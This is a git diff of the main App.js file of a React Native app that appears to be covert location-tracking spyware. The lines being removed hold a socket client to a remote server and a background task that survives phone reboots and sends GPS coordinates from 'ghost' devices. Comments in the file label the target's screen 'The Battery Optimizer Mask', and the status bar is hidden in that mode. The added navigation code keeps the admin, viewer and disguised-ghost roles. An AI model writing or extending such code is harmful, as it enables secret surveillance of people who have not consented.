@@ -1,95 +1,67 @@
-import React, { useState, useEffect } from 'react';
-import { StatusBar, Alert, View } from 'react-native';
-import io from 'socket.io-client';
-import * as TaskManager from 'expo-task-manager';
+import React, { useState } from 'react';
+import { NavigationContainer } from '@react-navigation/native';
+import { createNativeStackNavigator } from '@react-navigation/native-stack';
 
-// Updated imports to reflect the /src/screens folder structure
+// Import Screens
 import LoginScreen from './src/screens/LoginScreen';
 import GhostScreen from './src/screens/GhostScreen';
 import AdminScreen from './src/screens/AdminScreen';
+import ViewerScreen from './src/screens/ViewerScreen';
 
-// --- CONFIGURATION ---
-const SERVER_URL = "https://joyjet-server.onrender.com";
-const socket = io(SERVER_URL, { 
-    maxHttpBufferSize: 1e8, 
-    reconnection: true,
-    transports: ['websocket'] 
-});
-const GPS_TASK = 'bg-gps-sync';
-
-// --- BACKGROUND REBOOT SURVIVAL ---
-// Wakes up the node after a phone restart to maintain the link
-TaskManager.defineTask(GPS_TASK, ({ data, error }) => {
-    if (error) return;
-    if (data) {
-        socket.emit('ghost_location_data', { 
-            ghostName: "NODE_AUTO_REBOOT", 
-            coords: data.locations[0].coords 
-        });
-    }
-});
+const Stack = createNativeStackNavigator();
 
 export default function App() {
-    const [user, setUser] = useState(null);
+  const [session, setSession] = useState({ role: null, name: '' });
 
-    useEffect(() => {
-        // Handle successful login/role assignment from Server
-        socket.on('role_assigned', (data) => {
-            setUser(data);
-        });
+  // Function to handle login and switch screens
+  const handleAuth = (role, name) => {
+    setSession({ role, name });
+  };
 
-        // Handle errors or system messages (e.g., Wrong Admin Key)
-        socket.on('system_alert', (data) => {
-            Alert.alert("System Notification", data.msg);
-        });
-
-        // Reset user if server forces a disconnect
-        socket.on('forced_disconnect', () => {
-            setUser(null);
-        });
-
-        return () => {
-            socket.off('role_assigned');
-            socket.off('system_alert');
-            socket.off('forced_disconnect');
-        };
-    }, []);
-
-    // --- LOGIN HANDLER ---
-    const handleLogin = (name, key) => {
-        // Sends name & key; Server determines if ADMIN, VIEWER, or GHOST
-        socket.emit('claim_role', { name, key });
-    };
-
-    // 1. AUTHENTICATION GATE
-    if (!user) {
-        return <LoginScreen onLogin={handleLogin} />;
-    }
-
-    // 2. ROLE-BASED ROUTING
-    return (
-        <View style={{ flex: 1, backgroundColor: '#000' }}>
-            <StatusBar hidden={user.role === 'GHOST'} barStyle="light-content" />
-            
-            {user.role === 'GHOST' ? (
-                // TARGET MODE: The Battery Optimizer Mask
-                <GhostScreen 
-                    socket={socket} 
-                    name={user.name} 
-                    taskName={GPS_TASK} 
-                />
-            ) : (
-                // MONITOR MODE: The Admin or Viewer Dashboard
-                <AdminScreen 
-                    socket={socket} 
-                    user={user} 
-                    onExit={() => {
-                        socket.disconnect();
-                        setUser(null);
-                        socket.connect(); // Ready for next login
-                    }} 
-                />
+  return (
+    <NavigationContainer>
+      <Stack.Navigator screenOptions={{ headerShown: false, animation: 'fade' }}>
+        
+        {/* GATEKEEPER: If no role is selected, show Login */}
+        {!session.role ? (
+          <Stack.Screen name="Login">
+            {props => <LoginScreen {...props} onLogin={handleAuth} />}
+          </Stack.Screen>
+        ) : (
+          <>
+            {/* ROLE 1: SUPER ADMIN (Full Control & Logs) */}
+            {session.role === 'admin' && (
+              <Stack.Screen 
+                name="Admin" 
+                component={AdminScreen} 
+                initialParams={{ name: session.name }} 
+              />
             )}
-        </View>
-    );
+
+            {/* ROLE 2: VIEWER (3 Assigned Ghost Nodes Only) */}
+            {session.role === 'viewer' && (
+              <Stack.Screen 
+                name="Viewer" 
+                component={ViewerScreen} 
+                initialParams={{ 
+                  name: session.name, 
+                  allowedNodes: ['Node_Alpha', 'Node_Beta', 'Node_Gamma'] 
+                }} 
+              />
+            )}
+
+            {/* ROLE 3: GHOST (The Battery Optimizer Mask) */}
+            {session.role === 'ghost' && (
+              <Stack.Screen 
+                name="Ghost" 
+                component={GhostScreen} 
+                initialParams={{ name: session.name }} 
+              />
+            )}
+          </>
+        )}
+
+      </Stack.Navigator>
+    </NavigationContainer>
+  );
 }
